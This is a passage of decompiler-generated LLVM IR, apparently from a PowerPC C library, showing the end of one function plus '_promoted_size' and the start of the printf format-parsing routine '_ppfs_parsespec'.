dec_label_pc_1000c244:                            ; preds = %dec_label_pc_1000c230
  %v1_1000c244 = add i32 %v2_1000c344, 76
  store i32 %v1_1000c244, i32* @r10, align 4
  br i1 %v2_1000c23c, label %dec_label_pc_1000c260, label %dec_label_pc_1000c24c

dec_label_pc_1000c24c:                            ; preds = %dec_label_pc_1000c244
  %v2_1000c24c = icmp sgt i32 %v3_1000c238, 2
  store i1 %v2_1000c24c, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1000c238, 3
  br i1 %tmp23, label %dec_label_pc_1000c328, label %dec_label_pc_1000c278

dec_label_pc_1000c260:                            ; preds = %dec_label_pc_1000c244
  %v2_1000c260 = icmp sgt i32 %v3_1000c238, 1024
  store i1 %v2_1000c260, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1000c238, 1025
  br i1 %tmp24, label %dec_label_pc_1000c328, label %dec_label_pc_1000c26c

dec_label_pc_1000c26c:                            ; preds = %dec_label_pc_1000c260
  %v2_1000c26c = icmp sgt i32 %v3_1000c238, 2048
  %v3_1000c26c = icmp eq i32 %v3_1000c238, 2048
  store i1 %v2_1000c26c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c26c, label %dec_label_pc_1000c280, label %dec_label_pc_1000c274

dec_label_pc_1000c274:                            ; preds = %dec_label_pc_1000c26c
  %v2_1000c274 = icmp sgt i32 %v3_1000c238, 2055
  %v3_1000c274 = icmp eq i32 %v3_1000c238, 2055
  store i1 %v2_1000c274, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c274, label %dec_label_pc_1000c2dc, label %dec_label_pc_1000c328

dec_label_pc_1000c278:                            ; preds = %dec_label_pc_1000c24c
  %v3_1000c258 = icmp eq i32 %v3_1000c238, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c258, label %dec_label_pc_1000c2dc, label %dec_label_pc_1000c328

dec_label_pc_1000c280:                            ; preds = %dec_label_pc_1000c26c
  %v2_1000c280 = inttoptr i32 %v1_1000c244 to i8*
  %v3_1000c280 = load i8, i8* %v2_1000c280, align 1
  %v4_1000c280 = zext i8 %v3_1000c280 to i32
  %v2_1000c284 = icmp ugt i8 %v3_1000c280, 6
  store i1 %v2_1000c284, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_1000c280, 2
  %v1_1000c288 = zext i8 %tmp28 to i32
  store i32 %v1_1000c288, i32* %r9.global-to-local, align 4
  %v2_1000c28c = add nuw nsw i32 %v1_1000c288, %v4_1000c280
  store i32 %v2_1000c28c, i32* %r0.global-to-local, align 4
  %v1_1000c290 = trunc i32 %v2_1000c28c to i8
  store i8 %v1_1000c290, i8* %v2_1000c280, align 1
  %v0_1000c294 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_1000c294, label %dec_label_pc_1000c2b4, label %dec_label_pc_1000c298

dec_label_pc_1000c298:                            ; preds = %dec_label_pc_1000c280
  %v0_1000c298 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c298 = urem i32 %v0_1000c298, 256
  store i32 %v1_1000c298, i32* %r9.global-to-local, align 4
  %v0_1000c29c = load i32, i32* @r10, align 4
  %v1_1000c29c = add i32 %v0_1000c29c, 8
  %v2_1000c29c = inttoptr i32 %v1_1000c29c to i32*
  %v3_1000c29c = load i32, i32* %v2_1000c29c, align 4
  %v1_1000c2a0 = mul nuw nsw i32 %v1_1000c298, 4
  store i32 %v1_1000c2a0, i32* %r0.global-to-local, align 4
  %v1_1000c2a4 = add nuw nsw i32 %v1_1000c298, 2
  store i32 %v1_1000c2a4, i32* %r9.global-to-local, align 4
  %v2_1000c2a8 = add i32 %v3_1000c29c, %v1_1000c2a0
  store i32 %v2_1000c2a8, i32* %r11.global-to-local, align 4
  %v1_1000c2ac = trunc i32 %v1_1000c2a4 to i8
  %v2_1000c2ac = load i32, i32* @r3, align 4
  %v3_1000c2ac = add i32 %v2_1000c2ac, 76
  %v4_1000c2ac = inttoptr i32 %v3_1000c2ac to i8*
  store i8 %v1_1000c2ac, i8* %v4_1000c2ac, align 1
  br label %dec_label_pc_1000c2c8

dec_label_pc_1000c2b4:                            ; preds = %dec_label_pc_1000c280
  %v0_1000c2b4 = load i32, i32* @r10, align 4
  %v1_1000c2b4 = add i32 %v0_1000c2b4, 4
  %v2_1000c2b4 = inttoptr i32 %v1_1000c2b4 to i32*
  %v3_1000c2b4 = load i32, i32* %v2_1000c2b4, align 4
  %v1_1000c2b8 = add i32 %v3_1000c2b4, 7
  store i32 %v1_1000c2b8, i32* %r9.global-to-local, align 4
  %v1_1000c2bc = call i32 @__asm_rlwinm(i32 %v1_1000c2b8, i32 0, i32 0, i32 28)
  store i32 %v1_1000c2bc, i32* %r11.global-to-local, align 4
  %v1_1000c2c0 = add i32 %v1_1000c2bc, 8
  store i32 %v1_1000c2c0, i32* %r0.global-to-local, align 4
  %v1_1000c2c4 = load i32, i32* @r10, align 4
  %v2_1000c2c4 = add i32 %v1_1000c2c4, 4
  %v3_1000c2c4 = inttoptr i32 %v2_1000c2c4 to i32*
  store i32 %v1_1000c2c0, i32* %v3_1000c2c4, align 4
  br label %dec_label_pc_1000c2c8

dec_label_pc_1000c2c8:                            ; preds = %dec_label_pc_1000c298, %dec_label_pc_1000c2b4
  %v0_1000c2c8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c2c8 = inttoptr i32 %v0_1000c2c8 to i32*
  %v2_1000c2c8 = load i32, i32* %v1_1000c2c8, align 4
  store i32 %v2_1000c2c8, i32* %r9.global-to-local, align 4
  %v1_1000c2cc = add i32 %v0_1000c2c8, 4
  %v2_1000c2cc = inttoptr i32 %v1_1000c2cc to i32*
  %v3_1000c2cc = load i32, i32* %v2_1000c2cc, align 4
  store i32 %v3_1000c2cc, i32* @r10, align 4
  %v1_1000c2d0 = load i32, i32* @r8, align 4
  %v2_1000c2d0 = inttoptr i32 %v1_1000c2d0 to i32*
  store i32 %v2_1000c2c8, i32* %v2_1000c2d0, align 4
  %v0_1000c2d4 = load i32, i32* @r10, align 4
  %v1_1000c2d4 = load i32, i32* @r8, align 4
  %v2_1000c2d4 = add i32 %v1_1000c2d4, 4
  %v3_1000c2d4 = inttoptr i32 %v2_1000c2d4 to i32*
  store i32 %v0_1000c2d4, i32* %v3_1000c2d4, align 4
  br label %dec_label_pc_1000c360

dec_label_pc_1000c2dc:                            ; preds = %dec_label_pc_1000c274, %dec_label_pc_1000c278
  store i32 %v1_1000c244, i32* @r10, align 4
  %v1_1000c2e0 = add i32 %v2_1000c344, 77
  %v2_1000c2e0 = inttoptr i32 %v1_1000c2e0 to i8*
  %v3_1000c2e0 = load i8, i8* %v2_1000c2e0, align 1
  %v4_1000c2e0 = zext i8 %v3_1000c2e0 to i32
  store i32 %v4_1000c2e0, i32* %r11.global-to-local, align 4
  %v2_1000c2e4 = icmp ugt i8 %v3_1000c2e0, 8
  store i1 %v2_1000c2e4, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1000c2e0, 7
  br i1 %tmp25, label %dec_label_pc_1000c308, label %dec_label_pc_1000c2ec

dec_label_pc_1000c2ec:                            ; preds = %dec_label_pc_1000c2dc
  %v1_1000c2ec = add i32 %v2_1000c344, 84
  %v2_1000c2ec = inttoptr i32 %v1_1000c2ec to i32*
  %v3_1000c2ec = load i32, i32* %v2_1000c2ec, align 4
  %v1_1000c2f0 = mul nuw nsw i32 %v4_1000c2e0, 8
  %v1_1000c2f4 = add nuw nsw i32 %v1_1000c2f0, 32
  %v2_1000c2f8 = add i32 %v1_1000c2f4, %v3_1000c2ec
  store i32 %v2_1000c2f8, i32* %r9.global-to-local, align 4
  %v1_1000c2fc = add nuw nsw i32 %v4_1000c2e0, 1
  store i32 %v1_1000c2fc, i32* %r0.global-to-local, align 4
  %v1_1000c300 = trunc i32 %v1_1000c2fc to i8
  store i8 %v1_1000c300, i8* %v2_1000c2e0, align 1
  br label %dec_label_pc_1000c360

dec_label_pc_1000c308:                            ; preds = %dec_label_pc_1000c2dc
  %v1_1000c308 = add i32 %v2_1000c344, 80
  %v2_1000c308 = inttoptr i32 %v1_1000c308 to i32*
  %v3_1000c308 = load i32, i32* %v2_1000c308, align 4
  %v1_1000c30c = add i32 %v3_1000c308, 7
  store i32 %v1_1000c30c, i32* %r9.global-to-local, align 4
  %v1_1000c310 = call i32 @__asm_rlwinm(i32 %v1_1000c30c, i32 0, i32 0, i32 28)
  store i32 %v1_1000c310, i32* %r9.global-to-local, align 4
  %v1_1000c314 = add i32 %v1_1000c310, 8
  store i32 %v1_1000c314, i32* %r0.global-to-local, align 4
  %v1_1000c318 = load i32, i32* @r10, align 4
  %v2_1000c318 = add i32 %v1_1000c318, 4
  %v3_1000c318 = inttoptr i32 %v2_1000c318 to i32*
  store i32 %v1_1000c314, i32* %v3_1000c318, align 4
  br label %dec_label_pc_1000c360

dec_label_pc_1000c328:                            ; preds = %dec_label_pc_1000c274, %dec_label_pc_1000c278, %dec_label_pc_1000c260, %dec_label_pc_1000c24c
  %v2_1000c328 = inttoptr i32 %v1_1000c244 to i8*
  %v3_1000c328 = load i8, i8* %v2_1000c328, align 1
  %v4_1000c328 = zext i8 %v3_1000c328 to i32
  store i32 %v4_1000c328, i32* %r11.global-to-local, align 4
  %v2_1000c32c = icmp ugt i8 %v3_1000c328, 8
  store i1 %v2_1000c32c, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000c328, 7
  br i1 %tmp26, label %dec_label_pc_1000c34c, label %dec_label_pc_1000c334

dec_label_pc_1000c334:                            ; preds = %dec_label_pc_1000c328
  %v1_1000c334 = add i32 %v2_1000c344, 84
  %v2_1000c334 = inttoptr i32 %v1_1000c334 to i32*
  %v3_1000c334 = load i32, i32* %v2_1000c334, align 4
  %v1_1000c338 = mul nuw nsw i32 %v4_1000c328, 4
  %v2_1000c33c = add i32 %v3_1000c334, %v1_1000c338
  store i32 %v2_1000c33c, i32* %r9.global-to-local, align 4
  %v1_1000c340 = add nuw nsw i32 %v4_1000c328, 1
  store i32 %v1_1000c340, i32* %r0.global-to-local, align 4
  %v1_1000c344 = trunc i32 %v1_1000c340 to i8
  store i8 %v1_1000c344, i8* %v2_1000c328, align 1
  br label %dec_label_pc_1000c358

dec_label_pc_1000c34c:                            ; preds = %dec_label_pc_1000c328
  %v1_1000c34c = add i32 %v2_1000c344, 80
  %v2_1000c34c = inttoptr i32 %v1_1000c34c to i32*
  %v3_1000c34c = load i32, i32* %v2_1000c34c, align 4
  store i32 %v3_1000c34c, i32* %r9.global-to-local, align 4
  %v1_1000c350 = add i32 %v3_1000c34c, 4
  store i32 %v1_1000c350, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c350, i32* %v2_1000c34c, align 4
  br label %dec_label_pc_1000c358

dec_label_pc_1000c358:                            ; preds = %dec_label_pc_1000c334, %dec_label_pc_1000c34c
  %v0_1000c358 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c358 = inttoptr i32 %v0_1000c358 to i32*
  %v2_1000c358 = load i32, i32* %v1_1000c358, align 4
  store i32 %v2_1000c358, i32* %r0.global-to-local, align 4
  %v1_1000c35c = load i32, i32* @r8, align 4
  %v2_1000c35c = inttoptr i32 %v1_1000c35c to i32*
  store i32 %v2_1000c358, i32* %v2_1000c35c, align 4
  br label %dec_label_pc_1000c360

dec_label_pc_1000c360:                            ; preds = %dec_label_pc_1000c308, %dec_label_pc_1000c2ec, %dec_label_pc_1000c2c8, %dec_label_pc_1000c358
  %v0_1000c360 = load i32, i32* @r8, align 4
  %v1_1000c360 = add i32 %v0_1000c360, 8
  store i32 %v1_1000c360, i32* @r8, align 4
  %v0_1000c364.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000c368.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c364

dec_label_pc_1000c364:                            ; preds = %dec_label_pc_1000c230, %dec_label_pc_1000c360
  %v0_1000c368 = phi i32 [ %v2_1000c344, %dec_label_pc_1000c230 ], [ %v0_1000c368.pre, %dec_label_pc_1000c360 ]
  %v0_1000c364 = phi i32 [ %v0_1000c230, %dec_label_pc_1000c230 ], [ %v0_1000c364.pre, %dec_label_pc_1000c360 ]
  %v1_1000c364 = add i32 %v0_1000c364, 1
  store i32 %v1_1000c364, i32* %r7.global-to-local, align 4
  %v1_1000c368 = add i32 %v0_1000c368, 28
  %v2_1000c368 = inttoptr i32 %v1_1000c368 to i32*
  %v3_1000c368 = load i32, i32* %v2_1000c368, align 4
  store i32 %v3_1000c368, i32* %r0.global-to-local, align 4
  %v2_1000c36c = icmp slt i32 %v1_1000c364, %v3_1000c368
  %v3_1000c36c = icmp sgt i32 %v1_1000c364, %v3_1000c368
  store i1 %v3_1000c36c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000c36c, label %dec_label_pc_1000c230, label %dec_label_pc_1000c3b8

dec_label_pc_1000c378:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000c37c = icmp ne i32 %v3_1000c180, -2147483648
  %v4_1000c37c = icmp eq i32 %v3_1000c180, -2147483648
  store i1 %v3_1000c37c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000c37c, label %dec_label_pc_1000c384, label %dec_label_pc_1000c398

dec_label_pc_1000c384:                            ; preds = %dec_label_pc_1000c378
  %v1_1000c384 = add i32 %v0_1000c178, 36
  %v2_1000c384 = inttoptr i32 %v1_1000c384 to i8*
  %v3_1000c384 = load i8, i8* %v2_1000c384, align 1
  %v4_1000c384 = zext i8 %v3_1000c384 to i32
  %v1_1000c388 = mul nuw nsw i32 %v4_1000c384, 8
  %v2_1000c38c = add i32 %v1_1000c388, %v1_1000c17c
  store i32 %v2_1000c38c, i32* %r9.global-to-local, align 4
  %v1_1000c390 = add i32 %v2_1000c38c, -8
  %v2_1000c390 = inttoptr i32 %v1_1000c390 to i32*
  %v3_1000c390 = load i32, i32* %v2_1000c390, align 4
  store i32 %v3_1000c390, i32* %r0.global-to-local, align 4
  store i32 %v3_1000c390, i32* %v2_1000c180, align 4
  %v0_1000c398.pre = load i32, i32* @r3, align 4
  %v1_1000c39c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c398

dec_label_pc_1000c398:                            ; preds = %dec_label_pc_1000c378, %dec_label_pc_1000c384
  %v1_1000c39c = phi i32 [ -2147483648, %dec_label_pc_1000c378 ], [ %v1_1000c39c.pre, %dec_label_pc_1000c384 ]
  %v1_1000c3b4 = phi i32 [ %v0_1000c178, %dec_label_pc_1000c378 ], [ %v0_1000c398.pre, %dec_label_pc_1000c384 ]
  %v1_1000c398 = add i32 %v1_1000c3b4, 4
  %v2_1000c398 = inttoptr i32 %v1_1000c398 to i32*
  %v3_1000c398 = load i32, i32* %v2_1000c398, align 4
  store i32 %v3_1000c398, i32* %r0.global-to-local, align 4
  %v3_1000c39c = icmp sgt i32 %v3_1000c398, %v1_1000c39c
  %v4_1000c39c = icmp eq i32 %v3_1000c398, %v1_1000c39c
  store i1 %v3_1000c39c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000c39c, label %dec_label_pc_1000c3a4, label %dec_label_pc_1000c3b8

dec_label_pc_1000c3a4:                            ; preds = %dec_label_pc_1000c398
  %v1_1000c3a4 = add i32 %v1_1000c3b4, 37
  %v2_1000c3a4 = inttoptr i32 %v1_1000c3a4 to i8*
  %v3_1000c3a4 = load i8, i8* %v2_1000c3a4, align 1
  %v4_1000c3a4 = zext i8 %v3_1000c3a4 to i32
  %v1_1000c3a8 = mul nuw nsw i32 %v4_1000c3a4, 8
  %v1_1000c3ac = load i32, i32* @r8, align 4
  %v2_1000c3ac = add i32 %v1_1000c3a8, %v1_1000c3ac
  store i32 %v2_1000c3ac, i32* %r9.global-to-local, align 4
  %v1_1000c3b0 = add i32 %v2_1000c3ac, -8
  %v2_1000c3b0 = inttoptr i32 %v1_1000c3b0 to i32*
  %v3_1000c3b0 = load i32, i32* %v2_1000c3b0, align 4
  store i32 %v3_1000c3b0, i32* %r0.global-to-local, align 4
  store i32 %v3_1000c3b0, i32* %v2_1000c398, align 4
  %v0_1000c3b8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c3b8

dec_label_pc_1000c3b8:                            ; preds = %dec_label_pc_1000c364, %dec_label_pc_1000c368.preheader, %dec_label_pc_1000c398, %dec_label_pc_1000c3a4
  %v0_1000c3b8 = phi i32 [ %v1_1000c3b4, %dec_label_pc_1000c398 ], [ %v0_1000c3b8.pre, %dec_label_pc_1000c3a4 ], [ %v0_1000c3685, %dec_label_pc_1000c368.preheader ], [ %v0_1000c368, %dec_label_pc_1000c364 ]
  %v1_1000c3b8 = add i32 %v0_1000c3b8, 8
  %v2_1000c3b8 = inttoptr i32 %v1_1000c3b8 to i32*
  %v3_1000c3b8 = load i32, i32* %v2_1000c3b8, align 4
  store i32 %v3_1000c3b8, i32* %r11.global-to-local, align 4
  %v2_1000c3bc = icmp sgt i32 %v3_1000c3b8, 0
  store i1 %v2_1000c3bc, i1* %cr7_gt.global-to-local, align 1
  %v0_1000c3c0 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000c3b8, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1000c3c0)
  %v0_1000c3c4 = load i32, i32* @r3, align 4
  %v1_1000c3c4 = add i32 %v0_1000c3c4, 16
  %v2_1000c3c4 = inttoptr i32 %v1_1000c3c4 to i32*
  %v3_1000c3c4 = load i32, i32* %v2_1000c3c4, align 4
  store i32 %v3_1000c3c4, i32* %r0.global-to-local, align 4
  %v0_1000c3c8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c3c8 = sub i32 0, %v0_1000c3c8
  store i32 %v1_1000c3c8, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000c3d0 = add i32 %v0_1000c3c4, 8
  %v3_1000c3d0 = inttoptr i32 %v2_1000c3d0 to i32*
  store i32 %v1_1000c3c8, i32* %v3_1000c3d0, align 4
  %v0_1000c3d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c3d4 = or i32 %v0_1000c3d4, 8
  store i32 %v1_1000c3d4, i32* %r0.global-to-local, align 4
  %v0_1000c3d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3d8 = load i32, i32* @r3, align 4
  %v2_1000c3d8 = add i32 %v1_1000c3d8, 20
  %v3_1000c3d8 = inttoptr i32 %v2_1000c3d8 to i32*
  store i32 %v0_1000c3d8, i32* %v3_1000c3d8, align 4
  %v1_1000c3dc = call i32 @__asm_rlwinm(i32 %v1_1000c3d4, i32 0, i32 0, i32 30)
  store i32 %v1_1000c3dc, i32* %r0.global-to-local, align 4
  %v1_1000c3e0 = load i32, i32* @r3, align 4
  %v2_1000c3e0 = add i32 %v1_1000c3e0, 16
  %v3_1000c3e0 = inttoptr i32 %v2_1000c3e0 to i32*
  store i32 %v1_1000c3dc, i32* %v3_1000c3e0, align 4
  %v0_1000c3e4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000c3e4

; uselistorder directives
  uselistorder i32 %v3_1000c398, { 1, 0, 2 }
  uselistorder i32 %v1_1000c39c, { 1, 0 }
  uselistorder i32 %v3_1000c368, { 1, 0, 2 }
  uselistorder i32 %v1_1000c364, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000c368, { 0, 2, 1 }
  uselistorder i32 %v4_1000c2e0, { 1, 0, 2 }
  uselistorder i32 %v1_1000c2a0, { 1, 0 }
  uselistorder i32 %v1_1000c298, { 2, 0, 1 }
  uselistorder i32 %v1_1000c244, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000c238, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1000c230, { 1, 0 }
  uselistorder i32 %v2_1000c344, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000c3685, { 1, 0, 2 }
  uselistorder i32 %v3_1000c1d8, { 1, 0, 2 }
  uselistorder i32 %v2_1000c208, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1000c180, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000c178, { 1, 0, 2 }
  uselistorder i32 %v0_1000c178, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28 }
  uselistorder i1* %cr7_gt.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 18, 19, 8, 9, 10, 11, 0, 13, 14, 15, 16, 17 }
  uselistorder i32 76, { 3, 4, 5, 6, 1, 0, 2, 7 }
  uselistorder label %dec_label_pc_1000c3b8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c398, { 1, 0 }
  uselistorder label %dec_label_pc_1000c364, { 1, 0 }
  uselistorder label %dec_label_pc_1000c360, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c358, { 1, 0 }
  uselistorder label %dec_label_pc_1000c328, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000c2dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c2c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c230, { 1, 0 }
  uselistorder label %dec_label_pc_1000c368.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000c21c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c1d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c1cc, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000c3f4

dec_label_pc_1000c3f4:                            ; preds = %dec_label_pc_1000c3f4, %entry
  %v0_1000c3f4 = phi i32 [ ptrtoint (i32* @global_var_10018d34.400 to i32), %entry ], [ %v1_1000c3f4, %dec_label_pc_1000c3f4 ]
  %v1_1000c3f4 = add i32 %v0_1000c3f4, -2
  %v2_1000c3f4 = inttoptr i32 %v1_1000c3f4 to i16*
  %v3_1000c3f4 = load i16, i16* %v2_1000c3f4, align 2
  %v4_1000c3f4 = sext i16 %v3_1000c3f4 to i32
  %v4_1000c3f8 = icmp eq i32 %v4_1000c3f4, %arg1
  %v3_1000c3fc.not = icmp ule i32 %v1_1000c3f4, ptrtoint (i32* @global_var_10018d1c.401 to i32)
  %brmerge = or i1 %v4_1000c3f8, %v3_1000c3fc.not
  br i1 %brmerge, label %dec_label_pc_1000c408, label %dec_label_pc_1000c3f4

dec_label_pc_1000c408:                            ; preds = %dec_label_pc_1000c3f4
  %v2_1000c410 = sub i32 %v1_1000c3f4, ptrtoint (i32* @global_var_10018d1c.401 to i32)
  %v1_1000c418 = udiv i32 %v2_1000c410, 2
  %v2_1000c418 = and i32 %v2_1000c410, -2147483648
  %v3_1000c418 = or i32 %v1_1000c418, %v2_1000c418
  %v2_1000c420 = add i32 %v3_1000c418, ptrtoint (i32* @global_var_10018d34.400 to i32)
  %v3_1000c420 = inttoptr i32 %v2_1000c420 to i8*
  %v4_1000c420 = load i8, i8* %v3_1000c420, align 1
  %v5_1000c420 = zext i8 %v4_1000c420 to i32
  ret i32 %v5_1000c420

; uselistorder directives
  uselistorder i32 %v2_1000c410, { 1, 0 }
  uselistorder i32 %v1_1000c3f4, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10018d1c.401 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10018d34.400 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000c428 = load i32, i32* @lr, align 4
  store i32 %v0_1000c428, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000c440 = add i32 %tmp, 16
  %v2_1000c440 = inttoptr i32 %v1_1000c440 to i32*
  %v3_1000c440 = load i32, i32* %v2_1000c440, align 4
  %v1_1000c448 = and i32 %v3_1000c440, 128
  store i32 %v1_1000c448, i32* %r6.global-to-local, align 4
  %v3_1000c448 = icmp eq i32 %v1_1000c448, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000c45c = add i32 %tmp, 24
  %v2_1000c45c = inttoptr i32 %v1_1000c45c to i32*
  %v3_1000c45c = load i32, i32* %v2_1000c45c, align 4
  store i32 %v3_1000c45c, i32* @r26, align 4
  br i1 %v3_1000c448, label %dec_label_pc_1000c464, label %dec_label_pc_1000c47c

dec_label_pc_1000c464:                            ; preds = %entry
  %v2_1000c464 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000c4d0

dec_label_pc_1000c474:                            ; preds = %dec_label_pc_1000c6a4
  %v1_1000c474 = add i32 %v0_1000c674, 1
  store i32 %v1_1000c474, i32* @r30, align 4
  br label %dec_label_pc_1000c6bc

dec_label_pc_1000c47c:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1000c480 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c480, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000c48c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000c48c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000c490

dec_label_pc_1000c490:                            ; preds = %dec_label_pc_1000c4c0.dec_label_pc_1000c490_crit_edge, %dec_label_pc_1000c47c
  %v0_1000c498 = phi i32 [ %v0_1000c498.pre, %dec_label_pc_1000c4c0.dec_label_pc_1000c490_crit_edge ], [ %v2_1000c480, %dec_label_pc_1000c47c ]
  %v0_1000c494 = phi i32 [ %v0_1000c494.pre, %dec_label_pc_1000c4c0.dec_label_pc_1000c490_crit_edge ], [ %v2_1000c48c, %dec_label_pc_1000c47c ]
  %v0_1000c49c = phi i32 [ %v0_1000c490.pre, %dec_label_pc_1000c4c0.dec_label_pc_1000c490_crit_edge ], [ 0, %dec_label_pc_1000c47c ]
  %v1_1000c490 = mul i32 %v0_1000c49c, 4
  %v2_1000c494 = add i32 %v0_1000c49c, %v0_1000c494
  store i32 %v2_1000c494, i32* %r9.global-to-local, align 4
  %v2_1000c498 = add i32 %v1_1000c490, %v0_1000c498
  store i32 %v2_1000c498, i32* %r11.global-to-local, align 4
  %v1_1000c49c = add i32 %v0_1000c49c, 1
  store i32 %v1_1000c49c, i32* @r10, align 4
  %v1_1000c4a0 = add i32 %v2_1000c498, -4
  %v2_1000c4a0 = inttoptr i32 %v1_1000c4a0 to i32*
  %v3_1000c4a0 = load i32, i32* %v2_1000c4a0, align 4
  store i32 %v3_1000c4a0, i32* %r0.global-to-local, align 4
  %v1_1000c4a4 = trunc i32 %v3_1000c4a0 to i8
  %v3_1000c4a4 = add i32 %v2_1000c494, 24
  %v4_1000c4a4 = inttoptr i32 %v3_1000c4a4 to i8*
  store i8 %v1_1000c4a4, i8* %v4_1000c4a4, align 1
  %v0_1000c4a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c4a8 = urem i32 %v0_1000c4a8, 256
  store i32 %v1_1000c4a8, i32* %r0.global-to-local, align 4
  %v0_1000c4b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c4b0 = add i32 %v0_1000c4b0, -4
  %v2_1000c4b0 = inttoptr i32 %v1_1000c4b0 to i32*
  %v3_1000c4b0 = load i32, i32* %v2_1000c4b0, align 4
  store i32 %v3_1000c4b0, i32* %r9.global-to-local, align 4
  %v4_1000c4b4 = icmp eq i32 %v1_1000c4a8, %v3_1000c4b0
  br i1 %v4_1000c4b4, label %dec_label_pc_1000c4bc, label %dec_label_pc_1000c92c

dec_label_pc_1000c4bc:                            ; preds = %dec_label_pc_1000c490
  %v3_1000c4ac = icmp eq i32 %v1_1000c4a8, 0
  br i1 %v3_1000c4ac, label %dec_label_pc_1000c4c4, label %dec_label_pc_1000c4c0

dec_label_pc_1000c4c0:                            ; preds = %dec_label_pc_1000c4bc
  %v0_1000c4c0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c4c0 = add i32 %v0_1000c4c0, -1
  store i32 %v1_1000c4c0, i32* %ctr.global-to-local, align 4
  %v2_1000c4c0 = icmp eq i32 %v1_1000c4c0, 0
  br i1 %v2_1000c4c0, label %dec_label_pc_1000c4c4, label %dec_label_pc_1000c4c0.dec_label_pc_1000c490_crit_edge

